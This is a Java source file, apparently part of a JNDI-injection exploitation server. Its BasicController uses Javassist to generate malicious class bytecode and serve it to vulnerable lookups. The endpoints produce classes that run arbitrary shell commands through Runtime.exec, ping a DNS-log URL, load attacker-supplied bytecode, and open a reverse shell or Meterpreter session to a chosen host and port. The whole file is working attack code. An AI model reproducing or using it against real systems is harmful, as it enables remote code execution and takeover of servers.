package map.jndi.controller;

import map.jndi.Config;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.server.WebServer;
import map.jndi.template.Meterpreter;
import map.jndi.template.ReverseShell;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import javassist.*;
import javassist.bytecode.AccessFlag;
import javassist.bytecode.ClassFile;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

@JNDIController
@JNDIMapping("/Basic")
public class BasicController implements Controller {
    public Object process(byte[] byteCode) throws Exception {
        System.out.println("[Reference] Remote codebase: " + Config.codebase);

        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
        String className = classFile.getName();
        WebServer.getInstance().serveFile("/" + className.replace('.', '/') + ".class", byteCode);

        return className;
    }

    @JNDIMapping("/DNSLog/{url}")
    public byte[] dnsLog(String url) throws Exception {
        System.out.println("[DnsLog] Url:" + url);

        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = String.format("new java.net.URL(\"%s\").hashCode();", url);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    @JNDIMapping("/Command/{cmd}")
    public byte[] command(String cmd) throws Exception {
        System.out.println("[Command] Cmd: " + cmd);

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = "java.lang.Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"});"
                .replace("COMMAND", cmd);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    @JNDIMapping("/FromUrl/{data}")
    public byte[] fromUrl(String data) {
        System.out.println("[FromUrl] Load custom bytecode data from url");
        byte[] byteCode = Base64.getUrlDecoder().decode(data);
        return byteCode;
    }

    @JNDIMapping("/FromFile/{path}")
    public byte[] fromFile(String path) throws Exception {
        System.out.println("[FromFile] Load custom bytecode data from file: " + path);
        byte[] byteCode = Files.readAllBytes(Paths.get(path));
        return byteCode;
    }

    @JNDIMapping("/ReverseShell/{host}/{port}")
    public byte[] reverseShell(String host, String port) throws Exception {
        System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ReverseShell.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));

        return clazz.toBytecode();
    }

    @JNDIMapping("/Meterpreter/{host}/{port}")
    public byte[] meterpreter(String host, String port) throws Exception {
        System.out.println("[Meterpreter]: Host: " + host + " Port: " + port);

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Meterpreter.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        ReflectUtil.setCtField(clazz, "lHost", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "lPort", CtField.Initializer.constant(Integer.parseInt(port)));

        return clazz.toBytecode();
    }
}
